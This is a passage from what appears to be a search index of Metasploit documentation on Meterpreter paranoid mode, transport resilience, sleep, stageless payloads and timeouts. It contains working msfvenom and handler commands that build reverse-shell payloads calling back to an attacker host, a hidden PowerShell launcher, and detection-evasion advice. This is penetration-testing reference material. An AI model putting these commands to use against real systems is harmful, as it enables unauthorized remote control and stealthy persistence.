windows/meterpreter/reverse_winhttps LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./www.example.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f psh-cmd -o launch-paranoid.bat $ head launch-paranoid.bat %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcg... A [[stageless|Meterpreter Stageless Mode]] version of this would look like the following: $ ./msfvenom -p windows/meterpreter_reverse_https LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./www.example.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless -f exe -o launch-paranoid-stageless.exe No platform was selected, choosing Msf::Module::Platform::Windows from the payload No Arch selected, selecting Arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 885314 bytes Saved as: launch-paranoid-stageless.exe","title":"Create a Paranoid Payload"},{"location":"dev/dark/Meterpreter-Paranoid-Mode/#create-a-paranoid-listener","text":"A staged payload would need to set the HandlerSSLCert and StagerVerifySSLCert options to enable TLS pinning and IgnoreUnknownPayloads to whitelist registered payload UUIDs: $ ./msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST www.example.com; set LPORT 443; set HandlerSSLCert ./www.example.com.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j' A stageless version is only slightly different: $ ./msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_https; set LHOST www.example.com; set LPORT 443; set HandlerSSLCert ./www.example.com.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'","title":"Create a Paranoid Listener"},{"location":"dev/dark/Meterpreter-Reliable-Network-Communication/","text":"Of the many recent changes to Meterpreter, reliable network communication is one of the more welcomed ones. For a long time, Meterpreter's communication with Metasploit has been relatively easy to break. Once broken, the session was officially dead, and the only way to get a session back was to replay the original exploitation path and establish a whole new session. In the case of HTTP/S transports, some resiliency features were present. Thanks to its stateless nature, HTTP/S transports would continue to attempt to talk to Metasploit after network outages or other unexpected problems as each command request/response is transmitted over a fresh connection. TCP based transports had nothing that would attempt to reconnect should some kind of network issue occur. Revamped transport implementations have provided support for resiliency even for TCP based communcations. Any session that isn't properly terminated by Metasploit will continue to function behind the scenes while Meterpreter attempts to re-establish communications with Metasploit. It is also possible to control the behaviour of this functionality a little via the use of the various timeout values that can be specified when adding transports to the session, and also on the fly for the current transport. For full details, please see the timeout documentation for details on those timeout values. Behind the scenes, Meterpreter now maintains a circular linked list of transports in memory while running. When a transport fails, Meterpreter will shut down and clean up the current transport mechanism resources, and will move onto the next one in the list. From there, Meterpreter will use this transport configuration to attempt to reconnect to Metasploit. It will continue to make these attempts until one of the following occurs: The overall session timeout value is reached, at which point the session is terminated. The Retry Total time for the transport is reached, at which point Meterpreter will move on to the next transport. The connection attempt is successful, and communications is re-established with Metasploit. If Meterpreter has a single transport configured, then it will continue to retry on that single transport repeatedly until the session timeout is reached, or a session is successfully created. Important note about resilient transports Now that both TCP and HTTP/S payloads contain resiliency features, it's important to know that exiting Metasploit using exit -y no longer terminates TCP sessions like it used to. If Metasploit is closed using exit -y without terminating existing sessions, both TCP and HTTP/S Meterpreter sessions will continue to run behind the scenes, attempting to connect back to Metasploit on the specified transports. If your intention is to exit Metasploit and terminate all of your sessions, then make sure you run sessions -K first.","title":"Meterpreter Reliable Network Communication"},{"location":"dev/dark/Meterpreter-Reliable-Network-Communication/#important-note-about-resilient-transports","text":"Now that both TCP and HTTP/S payloads contain resiliency features, it's important to know that exiting Metasploit using exit -y no longer terminates TCP sessions like it used to. If Metasploit is closed using exit -y without terminating existing sessions, both TCP and HTTP/S Meterpreter sessions will continue to run behind the scenes, attempting to connect back to Metasploit on the specified transports. If your intention is to exit Metasploit and terminate all of your sessions, then make sure you run sessions -K first.","title":"Important note about resilient transports"},{"location":"dev/dark/Meterpreter-Sleep-Control/","text":"There comes a time in the life of many a Meterpreter session when it needs to go quiet for a while. There are many reasons that this might be needed: During an assessment, the blue team may have detected suspicious activity, and communications is too noisy. Long term engagements require long-term shells, but the red team isn't awake 24-hours a day, and so keeping the communications active the whole time doesn't make sense. Users may just want to reduce the number of shells they have to worry about at a given time and want some of them to go away for a while. For these reasons, and more, the new sleep command in Meterpreter was created. This document explains what it is and how it works. Silent shells Noise during an assessment is not necessarily a good thing. With the advent of Meterpreter's new support and control of multiple transports , Meterpreter has the ability to change transports and therefore change the traffic pattern for communication. However, sometimes this isn't enough and sometimes users want to be able to shut the session off temporarily. The sleep command is designed to do just that: make the current Meterpreter session go to sleep for a specified period of time, and the wake up again once that time has expired. During this dormant period, no socket is active, no requests are made, and no responses are given. From the perspective of Metasploit it's as if the Meterpreter session doesn't exist. The interface to the sleep command looks like this: meterpreter > sleep Usage: sleep <time> time: Number of seconds to wait (positive integer) This command tells Meterpreter to go to sleep for the specified number of seconds. Sleeping will result in the transport being shut down and restarted after the designated timeout. As shown, sleep expects to be given a single postive integer value that represents the number of seconds that Meterpreter should be silent for. When run, the session will close, and then callback after the elapsed period of time. Given that Meterpreter lives in memory, this lack of communication will make it extremely difficult to track. The following shows a sample run where Meterpreter is put to sleep for 20 seconds, after which the session reconnects while the handler is still in background: meterpreter > sleep 20 [*] Telling the target instance to sleep for 20 seconds ... [+] Target instance has gone to sleep, terminating current session. [*] 10.1.10.35 - Meterpreter session 3 closed. Reason: User exit msf exploit(handler) > [*] Meterpreter session 4 opened (10.1.10.40:6005 -> 10.1.10.35:49315) at 2015-06-02 23:00:29 +1000 msf exploit(handler) > sessions -i 4 [*] Starting interaction with 4... meterpreter > getuid Server username: WIN-S45GUQ5KGVK\\OJ Under the hood The implementation of this command was made rather simple as a result of the work that was done to support multiple transports. To facilitate this command, all that happens is: A transport change is invoked, but the transport that is selected as the \"next\" transport is the same as the currently active one. The transport is shut down and the session is closed. The timeout value is passed to a call to sleep() , forcing the main thread of execution to pause for the allotted period of time. Execution resumes, and the resumption of connectivity continues in the usual transport switching fashion, only in this case, the transport that is fired up is the one that was just shut down. In short, the sleep command is a transport switch to the current transport with a delay. Simple!","title":"Meterpreter Sleep Control"},{"location":"dev/dark/Meterpreter-Sleep-Control/#silent-shells","text":"Noise during an assessment is not necessarily a good thing. With the advent of Meterpreter's new support and control of multiple transports , Meterpreter has the ability to change transports and therefore change the traffic pattern for communication. However, sometimes this isn't enough and sometimes users want to be able to shut the session off temporarily. The sleep command is designed to do just that: make the current Meterpreter session go to sleep for a specified period of time, and the wake up again once that time has expired. During this dormant period, no socket is active, no requests are made, and no responses are given. From the perspective of Metasploit it's as if the Meterpreter session doesn't exist. The interface to the sleep command looks like this: meterpreter > sleep Usage: sleep <time> time: Number of seconds to wait (positive integer) This command tells Meterpreter to go to sleep for the specified number of seconds. Sleeping will result in the transport being shut down and restarted after the designated timeout. As shown, sleep expects to be given a single postive integer value that represents the number of seconds that Meterpreter should be silent for. When run, the session will close, and then callback after the elapsed period of time. Given that Meterpreter lives in memory, this lack of communication will make it extremely difficult to track. The following shows a sample run where Meterpreter is put to sleep for 20 seconds, after which the session reconnects while the handler is still in background: meterpreter > sleep 20 [*] Telling the target instance to sleep for 20 seconds ... [+] Target instance has gone to sleep, terminating current session. [*] 10.1.10.35 - Meterpreter session 3 closed. Reason: User exit msf exploit(handler) > [*] Meterpreter session 4 opened (10.1.10.40:6005 -> 10.1.10.35:49315) at 2015-06-02 23:00:29 +1000 msf exploit(handler) > sessions -i 4 [*] Starting interaction with 4... meterpreter > getuid Server username: WIN-S45GUQ5KGVK\\OJ","title":"Silent shells"},{"location":"dev/dark/Meterpreter-Sleep-Control/#under-the-hood","text":"The implementation of this command was made rather simple as a result of the work that was done to support multiple transports. To facilitate this command, all that happens is: A transport change is invoked, but the transport that is selected as the \"next\" transport is the same as the currently active one. The transport is shut down and the session is closed. The timeout value is passed to a call to sleep() , forcing the main thread of execution to pause for the allotted period of time. Execution resumes, and the resumption of connectivity continues in the usual transport switching fashion, only in this case, the transport that is fired up is the one that was just shut down. In short, the sleep command is a transport switch to the current transport with a delay. Simple!","title":"Under the hood"},{"location":"dev/dark/Meterpreter-Stageless-Mode/","text":"Metasploit has long supported a mixture of staged and stageless payloads within its toolset. The mixture of payloads gives penetration testers a huge collection of options to choose from when performing exploitation. However, one option has been missing from this collection, and that is the notion of a stageless Meterpreter payload. In this post, I'd like to explain what this means, why you should care, and show how the latest update to Metasploit and Meterpreter provides this funky new feature as portended by Tod's last Wrapup post. What is a staged payload? A staged payload is simply a payload that is as compact as possible and performs the single task of providing the means for an attacker to upload something bigger. Staged payloads are often used in exploit scenarios due to the fact that binary exploitation often results in very little space for shellcode to be stored. The initial shellcode (often referred to as stage0 ) may create a new connection back to the attacker's machine and read a larger payload into memory. Once the payload has been received, stage0 passes control to the new, larger payload. In Metasploit terms, this payload is called reverse_tcp , and the second stage ( stage1 ) might be a standard command shell, or it might be something more complex, such as a Meterpreter shell or a VNC session. There are other staged options such as reverse_https and bind_tcp , both of which provide different transport options for opening the doorway for the second stage. Exploitation (recap) with staged Meterpreter Staged Meterpreter is Meterpreter as we currently know it. Every time we set PAYLOAD windows/meterpreter/... we are asking Metasploit to prepare a payload that is broken into two stages, the second of which gives us a Meterpreter session. For the benefit of those who aren't familiar with the process of exploitation with staged payloads, let's take a look at what goes on when we use this payload to exploit a Windows machine using ms08_067_netapi . The following image is a representation of two machines, an attacker and a target. The former is running Metasploit with the ms08_067_netapi exploit configured to use a staged Meterpreter payload that has stage0 set to reverse_tcp using port 4444 . The latter is an instance of Windows running a vulnerable implementation of SMB listening on port 445 . When the payload is executed, Metasploit creates a listener on the correct port, and then establishes a connection to the target SMB service. Behind the scenes, when the target SMB service receives the connection, a function is invoked which contains a stack buffer that the attacking machine will overflow. The attacking machine then sends data that is bigger than the target expects. This data, which contains stage0 and a small bit of exploit-specific code, overflows the target buff. The exploit-specific code allows for the attacker to gain control over EIP and redirect process execution to the stage0 shellcode. At this point, the attacker has control of execution within the SMB service, but doesn't really have the ability to do much else with it due to the size constraint. When stage0 ( reverse_tcp ) executes, it connects back to the attacker on the required port, which is ready and waiting with stage1 . In the case of Meterpreter, stage1 is a DLL called metsrv . The metsrv DLL is then sent to the target machine through this reverse connection. This is what is happening when we see the \"Sending stage ...\" message in msfconsole . The 769356 bytes that is shown in the above image represents the entire metsrv DLL (bear in mind this is an older version of metsrv , and hence it's a bit smaller in this image than it is these days). Once this has been pushed to the target machine, the stage0 shellcode writes this into memory. Once stage1 is in memory, stage0 passes control to it by simply jumping to the location where the payload was written to. In the case of metsrv , the first 60 (ish) bytes is a clever collection of shellcode that also looks similar to a valid DOS header. This shellcode, when executed, uses Reflective DLL Injection to remap and load metsrv into memory in such a way that allows it to function correctly as a normal DLL without writing it to disk or registering it with the host process. It then invokes DllMain() on this loaded DLL, and the Meterpreter that we know and love takes over. From here, MSF pushes up two Meterpreter extension DLLs: stdapi and priv . Both of these are also reflectively loaded in the same way the original metsrv DLL was. At this point, Meterpreter is now ready and willing to take your commands. What's wrong with staged Meterpreter? Staged Meterpreter, in scenarios like that shown above, is a wonderful thing and works very well. However, the are other scenarios for compromise where this approach is less than ideal. In case you didn't notice, in order to get a Meterpreter session running in the example scenario we uploaded the following: stage0 : large buffer of junk plus approximately 350b of shellcode. stage1 : metsrv DLL approximately 755kb . stage2 : stdapi DLL approximately 370kb . stage3 : priv DLL approximately 115kb . This weighs in at a grand total of approximately 1,240kb ! Not a small amount, particularly for those who aren't on the local network. The most common example of where this falls down is the case where penetration testers are in a low-bandwidth or high-latency environments and have pre-generated a stageled Meterpreter binary that is then hosted outside of the attacker's machine. Assessment targets download and invoke this binary, which results in the attacker gaining a Meterpreter shell on the target machine. The data or time cost of uploading metsrv , stdapi and priv for every single shell becomes unwieldy or outright impossible, even for a small number of shells. For large-scale compromise, via approaches such as GPO updates or SCCM packages, handling the volume of incoming connections at once can be bad enough; add the three DLL uploads to this mix and you have a recipe for lost shells and sadness. Nobody likes losing shells. Nobody likes sadness. It's hard to believe it possible, but in this case the following image could be considered a nightmare. In such a scenario, it would be better to have the ability to create a stage0 which includes metsrv and any number of Meterpreter extensions. This means that the payload already includes the important part of the Meterpreter functionality, along with all the features that the attacker might require. When invoked, the Meterpreter instance already has all it needs to function, and hence Metasploit doesn't need to waste time or bandwidth performing the usual uploads that are required with the staged approach. Stageless Meterpreter is exactly that. It is a binary that includes all of the required parts of Meterpreter, along with any required extensions, all bundled into one. What does stageless Meterpreter look like? As with the staged version, stageless Meterpreter payloads begin with a small bootstrapper. However, this bootstrapper looks very different. Staged Meterpreter payload bootstrappers contain shellcode that performs network communications in order to read in the second stage prior to invoking it. The stageless counterparts don't have this responsibility, as it is instead handled by metsrv itself. As a result, what we know as stage0 completely disappears. Instead, that which is known as stage1 in staged Meterpreter land becomes the bootstrapper for the payload in stageless Meterpreter land. To make this clear, let's take a look at the process. When creating the payload, Metasploit first reads a copy of the metsrv DLL into memory. It then overwrites the DLL's DOS header with a selection of shellcode that does the following: Performs a simple GetPC routine. Calculates the location of the ReflectiveLoader() function in metsrv . Invokes the ReflectiveLoader() function in metsrv . Calculates the location in memory which indicates the start of the list of pre-loaded extensions. This value is simply the location that immediately follows the end of metsrv . Invokes DllMain() on metsrv , passing in DLL_METASPLOIT_ATTACH along with the pointer to the extensions list. This is where metsrv takes over. When metsrv exits, the bootstrapper then calls DllMain() again with DLL_METASPLOIT_DETACH along with the selected EXITFUNC identifier. This is where metsrv exits using the appropriate method depending on what was chosen. With this shellcode stub wired into the DOS header, Metasploit adds the entire binary blob to an in-memory payload buffer, and then iterates through the list of chosen extensions. For each extension that is specified, Metasploit does the following: Loads the extension DLL into memory. Calculates the size of the DLL. Writes the size of the DLL as a 32-bit value to the end of payload buffer. Writes the entire body of the DLL, as-is, to the end of the payload buffer. Once the end of the list of extensions is reached, the last thing that is written to the payload buffer is a 32-bit representation of 0 ( NULL ) which indicates that the list of extensions has been terminated. This NULL value is what metsrv will look for when iterating through the list of extensions so that it knows when to stop. The final payload layout looks like the following: TODO Fix this up to include the configuration block. This payload can be embedded in an exe file, encoded, thrown into an exploit (assuming there's room!), and who knows what else! The important thing is that we now have all of the bits that we need in the one payload. How do I use stageless Meterpreter? Firstly, it has a different name! It follows the same convention as all of the other staged vs stageless payloads: Payload Staged Stageless Reverse TCP windows/meterpreter/reverse_tcp windows/meterpreter_reverse_tcp Reverse HTTPS windows/meterpreter/reverse_https windows/meterpreter_reverse_https Bind TCP windows/meterpreter/bind_tcp windows/meterpreter_bind_tcp Reverse TCP IPv6 windows/meterpreter/reverse_ipv6_tcp windows/meterpreter_reverse_ipv6_tcp To create a payload using one of these babies, you use msfvenom just like you would any other payload. To make a stageless payload that contains only metsrv we do the following: $ ./msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 -f exe -o stageless.exe Here we're making use of the Immunity Debugger program binary because it has a large enough .text section. To add extensions to the payload, we can make use of the EXTENSIONS parameter, which takes a comma-separated list of extension names. $ ./msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 EXTENSIONS=stdapi,priv -f exe -o stageless.exe With a payload created, we can set up a listener which will handle the connection using msfconsole . You'll notice that the EXTENSIONS parameter isn't set in the handler. This is because the handler isn't responsible for them as they're already in the payload binary. Also note the lack of the \"Sending stage ...\" message! This shows that the upload of stage1 didn't happen as it's not needed. If the payload that was invoked also contained stdapi and priv , then absolutely no uploads have occurred at this point. Congratulations, you're dancing with stageless Meterpreter! We're still in the process of finalising the Metasploit-side of how the pre-loaded extensions are managed. At this point, all of the pre-loaded extensions have been loaded into Meterpreter and are available for use. However, Metasploit is yet to know about them. To initiate client-site wiring of any of the pre-loaded extensions, the user can just type use <extension> just like they used to. Metasploit will check to see if the extension already exists in the target instance, and if it does, it will skip the extension upload and just wire-up the functions on the client side. If the extension is missing, then it will upload it and wire-up the functions on the fly just like it always has done. If you're working with meterpreter_reverse_https , you'll notice that when new shells come in they appear just like an orphaned instance. This is expected behaviour, because a stageless session can't and won't look any different to an old session that hasn't been in touch with Metasploit for a while.","title":"Meterpreter Stageless Mode"},{"location":"dev/dark/Meterpreter-Stageless-Mode/#what-is-a-staged-payload","text":"A staged payload is simply a payload that is as compact as possible and performs the single task of providing the means for an attacker to upload something bigger. Staged payloads are often used in exploit scenarios due to the fact that binary exploitation often results in very little space for shellcode to be stored. The initial shellcode (often referred to as stage0 ) may create a new connection back to the attacker's machine and read a larger payload into memory. Once the payload has been received, stage0 passes control to the new, larger payload. In Metasploit terms, this payload is called reverse_tcp , and the second stage ( stage1 ) might be a standard command shell, or it might be something more complex, such as a Meterpreter shell or a VNC session. There are other staged options such as reverse_https and bind_tcp , both of which provide different transport options for opening the doorway for the second stage.","title":"What is a staged payload?"},{"location":"dev/dark/Meterpreter-Stageless-Mode/#exploitation-recap-with-staged-meterpreter","text":"Staged Meterpreter is Meterpreter as we currently know it. Every time we set PAYLOAD windows/meterpreter/... we are asking Metasploit to prepare a payload that is broken into two stages, the second of which gives us a Meterpreter session. For the benefit of those who aren't familiar with the process of exploitation with staged payloads, let's take a look at what goes on when we use this payload to exploit a Windows machine using ms08_067_netapi . The following image is a representation of two machines, an attacker and a target. The former is running Metasploit with the ms08_067_netapi exploit configured to use a staged Meterpreter payload that has stage0 set to reverse_tcp using port 4444 . The latter is an instance of Windows running a vulnerable implementation of SMB listening on port 445 . When the payload is executed, Metasploit creates a listener on the correct port, and then establishes a connection to the target SMB service. Behind the scenes, when the target SMB service receives the connection, a function is invoked which contains a stack buffer that the attacking machine will overflow. The attacking machine then sends data that is bigger than the target expects. This data, which contains stage0 and a small bit of exploit-specific code, overflows the target buff. The exploit-specific code allows for the attacker to gain control over EIP and redirect process execution to the stage0 shellcode. At this point, the attacker has control of execution within the SMB service, but doesn't really have the ability to do much else with it due to the size constraint. When stage0 ( reverse_tcp ) executes, it connects back to the attacker on the required port, which is ready and waiting with stage1 . In the case of Meterpreter, stage1 is a DLL called metsrv . The metsrv DLL is then sent to the target machine through this reverse connection. This is what is happening when we see the \"Sending stage ...\" message in msfconsole . The 769356 bytes that is shown in the above image represents the entire metsrv DLL (bear in mind this is an older version of metsrv , and hence it's a bit smaller in this image than it is these days). Once this has been pushed to the target machine, the stage0 shellcode writes this into memory. Once stage1 is in memory, stage0 passes control to it by simply jumping to the location where the payload was written to. In the case of metsrv , the first 60 (ish) bytes is a clever collection of shellcode that also looks similar to a valid DOS header. This shellcode, when executed, uses Reflective DLL Injection to remap and load metsrv into memory in such a way that allows it to function correctly as a normal DLL without writing it to disk or registering it with the host process. It then invokes DllMain() on this loaded DLL, and the Meterpreter that we know and love takes over. From here, MSF pushes up two Meterpreter extension DLLs: stdapi and priv . Both of these are also reflectively loaded in the same way the original metsrv DLL was. At this point, Meterpreter is now ready and willing to take your commands.","title":"Exploitation (recap) with staged Meterpreter"},{"location":"dev/dark/Meterpreter-Stageless-Mode/#whats-wrong-with-staged-meterpreter","text":"Staged Meterpreter, in scenarios like that shown above, is a wonderful thing and works very well. However, the are other scenarios for compromise where this approach is less than ideal. In case you didn't notice, in order to get a Meterpreter session running in the example scenario we uploaded the following: stage0 : large buffer of junk plus approximately 350b of shellcode. stage1 : metsrv DLL approximately 755kb . stage2 : stdapi DLL approximately 370kb . stage3 : priv DLL approximately 115kb . This weighs in at a grand total of approximately 1,240kb ! Not a small amount, particularly for those who aren't on the local network. The most common example of where this falls down is the case where penetration testers are in a low-bandwidth or high-latency environments and have pre-generated a stageled Meterpreter binary that is then hosted outside of the attacker's machine. Assessment targets download and invoke this binary, which results in the attacker gaining a Meterpreter shell on the target machine. The data or time cost of uploading metsrv , stdapi and priv for every single shell becomes unwieldy or outright impossible, even for a small number of shells. For large-scale compromise, via approaches such as GPO updates or SCCM packages, handling the volume of incoming connections at once can be bad enough; add the three DLL uploads to this mix and you have a recipe for lost shells and sadness. Nobody likes losing shells. Nobody likes sadness. It's hard to believe it possible, but in this case the following image could be considered a nightmare. In such a scenario, it would be better to have the ability to create a stage0 which includes metsrv and any number of Meterpreter extensions. This means that the payload already includes the important part of the Meterpreter functionality, along with all the features that the attacker might require. When invoked, the Meterpreter instance already has all it needs to function, and hence Metasploit doesn't need to waste time or bandwidth performing the usual uploads that are required with the staged approach. Stageless Meterpreter is exactly that. It is a binary that includes all of the required parts of Meterpreter, along with any required extensions, all bundled into one.","title":"What's wrong with staged Meterpreter?"},{"location":"dev/dark/Meterpreter-Stageless-Mode/#what-does-stageless-meterpreter-look-like","text":"As with the staged version, stageless Meterpreter payloads begin with a small bootstrapper. However, this bootstrapper looks very different. Staged Meterpreter payload bootstrappers contain shellcode that performs network communications in order to read in the second stage prior to invoking it. The stageless counterparts don't have this responsibility, as it is instead handled by metsrv itself. As a result, what we know as stage0 completely disappears. Instead, that which is known as stage1 in staged Meterpreter land becomes the bootstrapper for the payload in stageless Meterpreter land. To make this clear, let's take a look at the process. When creating the payload, Metasploit first reads a copy of the metsrv DLL into memory. It then overwrites the DLL's DOS header with a selection of shellcode that does the following: Performs a simple GetPC routine. Calculates the location of the ReflectiveLoader() function in metsrv . Invokes the ReflectiveLoader() function in metsrv . Calculates the location in memory which indicates the start of the list of pre-loaded extensions. This value is simply the location that immediately follows the end of metsrv . Invokes DllMain() on metsrv , passing in DLL_METASPLOIT_ATTACH along with the pointer to the extensions list. This is where metsrv takes over. When metsrv exits, the bootstrapper then calls DllMain() again with DLL_METASPLOIT_DETACH along with the selected EXITFUNC identifier. This is where metsrv exits using the appropriate method depending on what was chosen. With this shellcode stub wired into the DOS header, Metasploit adds the entire binary blob to an in-memory payload buffer, and then iterates through the list of chosen extensions. For each extension that is specified, Metasploit does the following: Loads the extension DLL into memory. Calculates the size of the DLL. Writes the size of the DLL as a 32-bit value to the end of payload buffer. Writes the entire body of the DLL, as-is, to the end of the payload buffer. Once the end of the list of extensions is reached, the last thing that is written to the payload buffer is a 32-bit representation of 0 ( NULL ) which indicates that the list of extensions has been terminated. This NULL value is what metsrv will look for when iterating through the list of extensions so that it knows when to stop. The final payload layout looks like the following: TODO Fix this up to include the configuration block. This payload can be embedded in an exe file, encoded, thrown into an exploit (assuming there's room!), and who knows what else! The important thing is that we now have all of the bits that we need in the one payload.","title":"What does stageless Meterpreter look like?"},{"location":"dev/dark/Meterpreter-Stageless-Mode/#how-do-i-use-stageless-meterpreter","text":"Firstly, it has a different name! It follows the same convention as all of the other staged vs stageless payloads: Payload Staged Stageless Reverse TCP windows/meterpreter/reverse_tcp windows/meterpreter_reverse_tcp Reverse HTTPS windows/meterpreter/reverse_https windows/meterpreter_reverse_https Bind TCP windows/meterpreter/bind_tcp windows/meterpreter_bind_tcp Reverse TCP IPv6 windows/meterpreter/reverse_ipv6_tcp windows/meterpreter_reverse_ipv6_tcp To create a payload using one of these babies, you use msfvenom just like you would any other payload. To make a stageless payload that contains only metsrv we do the following: $ ./msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 -f exe -o stageless.exe Here we're making use of the Immunity Debugger program binary because it has a large enough .text section. To add extensions to the payload, we can make use of the EXTENSIONS parameter, which takes a comma-separated list of extension names. $ ./msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 EXTENSIONS=stdapi,priv -f exe -o stageless.exe With a payload created, we can set up a listener which will handle the connection using msfconsole . You'll notice that the EXTENSIONS parameter isn't set in the handler. This is because the handler isn't responsible for them as they're already in the payload binary. Also note the lack of the \"Sending stage ...\" message! This shows that the upload of stage1 didn't happen as it's not needed. If the payload that was invoked also contained stdapi and priv , then absolutely no uploads have occurred at this point. Congratulations, you're dancing with stageless Meterpreter! We're still in the process of finalising the Metasploit-side of how the pre-loaded extensions are managed. At this point, all of the pre-loaded extensions have been loaded into Meterpreter and are available for use. However, Metasploit is yet to know about them. To initiate client-site wiring of any of the pre-loaded extensions, the user can just type use <extension> just like they used to. Metasploit will check to see if the extension already exists in the target instance, and if it does, it will skip the extension upload and just wire-up the functions on the client side. If the extension is missing, then it will upload it and wire-up the functions on the fly just like it always has done. If you're working with meterpreter_reverse_https , you'll notice that when new shells come in they appear just like an orphaned instance. This is expected behaviour, because a stageless session can't and won't look any different to an old session that hasn't been in touch with Metasploit for a while.","title":"How do I use stageless Meterpreter?"},{"location":"dev/dark/Meterpreter-Timeout-Control/","text":"It is now possible to meticulously control a set of timeout-related behaviour in Meterpreter sessions. Timeouts may not seem important, but they change the noise levels of Meterpreter's communication resiliency features, and allow for the extension/reduction of time of the Meterpreter session as a whole. This document details what those timeouts are, and how to control them. Meterpreter's Timeout Values There are four timeout values that can be controlled by the user, and they are documented in the sections below. Meterpreter Session Timeout Each instance of Meterpreter has a lifetime that is defined as a session . The length of Meterpeter's life is defined by a parameter called the Session Timeout . This value can be specified when Meterpreter payloads are generated by using the SessionExpirationTimeout datastore option. The default value used is the equivalent of one whole week ( 604800 seconds), and hence this is what is used if the user does not override the value manually. The session's life begins at the point that metsrv (Meterpreter's core) takes over from the initial stage (if there is one). Once running, the session timer begins, and Meterpeter will monitor this timeout so that as soon as it is reached the session will be closed. If the timeout value is set to zero, this tells Meterpreter to never kill the session. If you're looking to have Meterpreter run for as long as it can, then setting this value to zero is the way to do it. It's important to note that this value lives outside of the realms of the other timeout values. That is, this value applies to Meterpreter as a whole, where the other three timeouts are specific to the individual transports that have been configured within the session. Meterpreter Transport Timeouts Each transport that is configured inside Meterpreter has three timeouts. The are as follows: Communication Timeout When Meterpreter talks to Metasploit packets are exchanged at a low level in a request/response fashion. In the case of TCP transports, this req/rep pattern is basically instant because TCP is a persistent connection. A request is handled by Meterpreter, and the response is immediately transferred as soon as the command has finished executing. In the case of HTTP/S payloads it's slightly different because the protocols are stateless. Meterpreter makes a GET request to Metasploit to check to see if a command has been executed by the user. The command is returned, the connection is closed, and Meterpreter executes the command asynchronously. When the command execution finishes, a second request is made that POST s the result back to Metasploit so that the user can consume it. Hence, for each command invocation, there are two HTTP/S requests. With TCP transports, communication \"times out\" when the time between the last packet and the current socket poll is greater than the communications timeout value. This happens when there are network related issues that prevent data from being transmitted between the two endpoints, but doesn't cause the socket to completely disconnect. With HTTP/S transports, the communication \"times out\" for the same reason, but the evaluation of the condition is slightly different in that failure can occur because there is either no response at all from the remote server, or the response to a GET request results in no acknowledgement. By default, this value is set to 300 seconds ( 5 minutes), but can be overidden by the user via the SessionCommunicationTimeout setting. If connectivity fails, or the communication is deemed to have timed out. Then the current transport is destroyed, and the next transport in the list of transports is invoked. From there, Meterpreter will use the Retry Total and Retry Wait values while attempting to re-establish a session with Metasploit. Retry Total and Retry Wait After a transport initialises inside Meterpreter, Meterpreter uses this transport to attempt to establish a new session with Metasploit. In some cases, Metasploit might not be availalble due to reasons like bad network connectivity, or a lack of configured listeners. If Meterpreter can't connect to Metasploit, it will attempt to retry for a period of time. Once that period of time expires, Meterpreter will deem this transport \"dead\" and will move to the next one in the transport list. The total amount of time that Meterpreter will attempt to connect back to Metasploit on the given transport is indicated by the retry total value. That is, retry total is the total amount of time that Meterpreter will retry communication on the transport. The default value is 3600 seconds ( 1 hour), and can be overridden via the SessionRetryTotal setting. While the current time is within the retry total time, Meterpreter will constantly attempt to establish connectivity. If it fails, it will wait for a period of time before trying again. The time between retry attempts on the current transport is called retry wait . That is, Meterpreter will wait for the number of seconds specified in retry wait between each connection attempt on the current transport. The default value is 10 seconds, and can be overridden via the SessionRetryWait setting. Changing Timeouts Meterpreter supports the querying and updating of each of these timeouts via the console. In order to get the current timeout settings, users can invoke the get_timeouts command, which returns all four of the current timeout settings (one for the global session, and three for the transport-specific settings). An example of which is shown below: meterpreter > get_timeouts Session Expiry : @ 2015-06-09 19:56:05 Comm Timeout : 100000 seconds Retry Total Time: 50000 seconds Retry Wait Time : 2500 seconds The Session Expiry value is rendered as an absolute local time so that the user knows when the session is due to expire. In order to update these values, users can invoke the set_timeouts command. Invoking it without parameters shows the help: meterpreter > set_timeouts Usage: set_timeouts [options] Set the current timeout options. Any or all of these can be set at once. OPTIONS: -c <opt> Comms timeout (seconds) -h Help menu -t <opt> Retry total time (seconds) -w <opt> Retry wait time (seconds) -x <opt> Expiration timout (seconds) As the help implies, each of these settings takes a value that indicates the number of seconds. Each of the options of this command are optional, so the user can update only those values that they are interested in updating. When the command is invoked, Meterpreter is updated, and the result shows the updated values once the changes have been made. In the case of the -x parameter, the value that is to be passed in should represent the total number of seconds from \"now\" until the session should expire. The following example updates the session expiration timeout to be 2 minutes from \"now\", and changes the retry wait time to 3 seconds: meterpreter > set_timeouts -x 120 -t 3 Session Expiry : @ 2015-06-02 22:45:13 Comm Timeout : 100000 seconds Retry Total Time: 3 seconds Retry Wait Time : 2500 seconds This command can be invoked any number of times while the session is valid, but as soon as the session has expired, Metepreter will shut down and it's game over: meterpreter > [*] 10.1.10.35 - Meterpreter session 2 closed. Reason: Died","title":"Meterpreter Timeout Control"},{"location":"dev/dark/Meterpreter-Timeout-Control/#meterpreters-timeout-values","text":"There are four timeout values that can be controlled by the user, and they are documented in the sections below.","title":"Meterpreter's Timeout Values"},{"location":"dev/dark/Meterpreter-Timeout-Control/#meterpreter-session-timeout","text":"Each instance of Meterpreter has a lifetime that is defined as a session . The length of Meterpeter's life is defined by a parameter called the Session Timeout . This value can be specified when Meterpreter payloads are generated by using the SessionExpirationTimeout datastore option. The default value used is the equivalent of one whole week ( 604800 seconds), and hence this is what is used if the user does not override the value manually. The session's life begins at the point that metsrv (Meterpreter's core) takes over from the initial stage (if there is one). Once running, the session timer begins, and Meterpeter will monitor this timeout so that as soon as it is reached the session will be closed. If the timeout value is set to zero, this tells Meterpreter to never kill the session. If you're looking 